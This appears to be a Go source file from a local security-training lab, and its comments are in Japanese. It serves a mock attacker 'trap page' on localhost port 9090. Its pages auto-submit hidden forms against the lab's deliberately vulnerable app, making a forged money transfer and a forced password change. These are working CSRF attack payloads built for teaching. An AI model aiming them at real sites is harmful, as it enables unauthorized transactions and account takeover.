package main

import (
	"log"
	"net/http"
)

// このファイルは CSRF の「攻撃者のサイト(罠ページ)」を模したもの。
// 本体(8080)とは別ポート(9090)で起動し、別オリジンから本体へリクエストを送らせる。
// 127.0.0.1 の別ポートは「同一サイト」扱いのため、SameSite=Lax 既定のブラウザでも Cookie が送られる。
// 本体と同様、127.0.0.1 にのみバインドする。

const trapListenAddr = "127.0.0.1:9090"

const trapIndexHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>罠ページ - vuln-lab</title></head>
<body>
<div style="background:#b00020;color:#fff;padding:8px 16px;font-weight:bold">⚠️ 攻撃者サイトを模した罠ページです(ローカル学習専用)</div>
<h1>おめでとうございます!</h1>
<p>(本来は魅力的な見せかけの内容で、被害者にリンクを踏ませます)</p>
<ul>
  <li><a href="/gift">プレゼントを受け取る</a>(開くと自動で送金フォームが送信される)</li>
  <li><a href="/survey">アンケートに答える</a>(開くと自動でパスワード変更フォームが送信される)</li>
</ul>
<p>先に <a href="http://127.0.0.1:8080/csrf/login" target="_blank">http://127.0.0.1:8080/csrf/login</a> でログインしてから開いてください。</p>
</body></html>`

// VULNERABLE な本体に対し、被害者のブラウザから勝手に POST させる自動送信フォーム。
const trapGiftHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>プレゼント</title></head>
<body onload="document.forms[0].submit()">
<p>プレゼントを準備中です...</p>
<form method="post" action="http://127.0.0.1:8080/csrf/transfer">
  <input type="hidden" name="to" value="bob">
  <input type="hidden" name="amount" value="30000">
</form>
</body></html>`

const trapSurveyHTML = `<!DOCTYPE html>
<html lang="ja"><head><meta charset="utf-8"><title>アンケート</title></head>
<body onload="document.forms[0].submit()">
<p>アンケートを読み込み中です...</p>
<form method="post" action="http://127.0.0.1:8080/csrf/password">
  <input type="hidden" name="new_password" value="hacked">
</form>
</body></html>`

func trapPage(body string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Write([]byte(body))
	}
}

func startTrapServer() {
	mux := http.NewServeMux()
	mux.Handle("GET /{$}", trapPage(trapIndexHTML))
	mux.Handle("GET /gift", trapPage(trapGiftHTML))
	mux.Handle("GET /survey", trapPage(trapSurveyHTML))

	go func() {
		log.Printf("trap server listening on http://%s", trapListenAddr)
		log.Println(http.ListenAndServe(trapListenAddr, mux))
	}()
}
